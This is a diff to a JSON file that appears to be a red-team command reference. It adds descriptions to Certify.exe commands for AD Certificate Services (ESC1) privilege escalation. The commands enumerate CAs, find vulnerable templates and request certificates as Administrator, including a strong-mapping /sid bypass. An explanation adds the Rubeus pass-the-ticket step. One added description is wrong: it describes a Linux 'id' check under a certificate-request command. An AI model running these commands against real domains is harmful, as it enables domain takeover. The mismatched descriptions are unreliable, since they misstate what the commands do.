@@ -231,27 +231,33 @@
   "variations": [
     {
       "label": "Enumerate CAs",
-      "command": "Certify.exe cas"
+      "command": "Certify.exe cas",
+      "description": "Enumerates Certificate Authorities in the Active Directory forest using Certify. Identifies ADCS infrastructure for certificate-based attack planning."
     },
     {
       "label": "Find vulnerable templates",
-      "command": "Certify.exe find /vulnerable"
+      "command": "Certify.exe find /vulnerable",
+      "description": "Uses Certify to find ADCS certificate templates with exploitable misconfigurations (ESC1-ESC8). Identifies templates that allow privilege escalation through certificate abuse."
     },
     {
       "label": "Find templates where enrollee supplies subject (ESC1)",
-      "command": "Certify.exe find /enrolleeSuppliesSubject"
+      "command": "Certify.exe find /enrolleeSuppliesSubject",
+      "description": "Find templates where enrollee supplies subject (ESC1). See the command syntax for exact parameters and flags."
     },
     {
       "label": "ESC1 with /sid (strong-mapping bypass)",
-      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:administrator /sid:<target_sid>"
+      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:administrator /sid:<target_sid>",
+      "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
     },
     {
       "label": "Windows openssl CSP conversion to PFX",
-      "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx"
+      "command": "openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx",
+      "description": "Uses OpenSSL for cryptographic operations - encryption, decryption, certificate management, or secure connections."
     },
     {
       "label": "EA impersonation via /altname",
-      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator"
+      "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator",
+      "description": "Uses Certify to request a certificate from a vulnerable template. Exploits misconfigured templates to obtain a certificate for another user (e.g., Domain Admin) for authentication."
     }
   ],
   "explain": "Requests a certificate from an ESC1 template (enrollee supplies the subject) to impersonate any user:\n  request                   enroll a certificate\n  /ca:<ca_server>\\<ca_name> the issuing CA to submit to\n  /template:<template_name> the ENROLLEE_SUPPLIES_SUBJECT template\n  /altname:<user>           the account to impersonate (set to Administrator for DA)\nYou receive a cert as that user; convert PEM to PFX and feed it to Rubeus asktgt to PKINIT and get their TGT (/ptt injects it)."
